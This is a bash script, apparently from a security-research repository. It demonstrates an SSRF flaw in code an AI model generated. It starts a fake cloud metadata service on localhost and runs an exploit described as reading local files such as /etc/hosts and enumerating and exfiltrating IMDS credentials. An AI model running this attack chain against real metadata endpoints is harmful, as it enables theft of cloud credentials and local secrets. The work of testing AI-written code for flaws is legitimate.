#!/usr/bin/env bash
# Demonstrates SSRF in output/claude-sonnet-4-5/ssrf_001.py.
#
# Same prompt as the gpt-4 ssrf demo; different model picked
# urllib.request.urlopen instead of requests.get, which gives the
# attacker an additional capability: file:// URLs work, so the
# SSRF doubles as an arbitrary-local-file-read primitive.
#
# This script:
#   1. Starts the fake IMDS on 127.0.0.1:8170 (sibling demo uses 8169).
#   2. Runs exploit.py through three exploitation paths:
#        Step 1: legitimate HTTP fetch (intended use)
#        Step 2: file:///etc/hosts and a /tmp secrets-file read
#        Step 3: IMDS credential enumeration + exfiltration
#   3. Tears down IMDS on exit.

set -euo pipefail

cd "$(dirname "$0")"

REPO_ROOT="$(cd ../.. && pwd)"
PYTHON="${PYTHON:-$REPO_ROOT/venv/bin/python}"

if [ ! -x "$PYTHON" ]; then
    echo "Error: cannot find project venv python at $PYTHON" >&2
    exit 1
fi

echo "=== Step 0: start fake IMDS on 127.0.0.1:8170 ==="
"$PYTHON" fake_imds.py > /tmp/ssrf_file_read_imds.log 2>&1 &
IMDS_PID=$!
trap "kill $IMDS_PID 2>/dev/null || true" EXIT
for _ in $(seq 1 30); do
    if curl -sf "http://127.0.0.1:8170/latest/meta-data/iam/security-credentials/" -o /dev/null; then break; fi
    sleep 0.1
done
echo "  fake IMDS PID: $IMDS_PID (will stop on script exit)"
echo

exec "$PYTHON" exploit.py
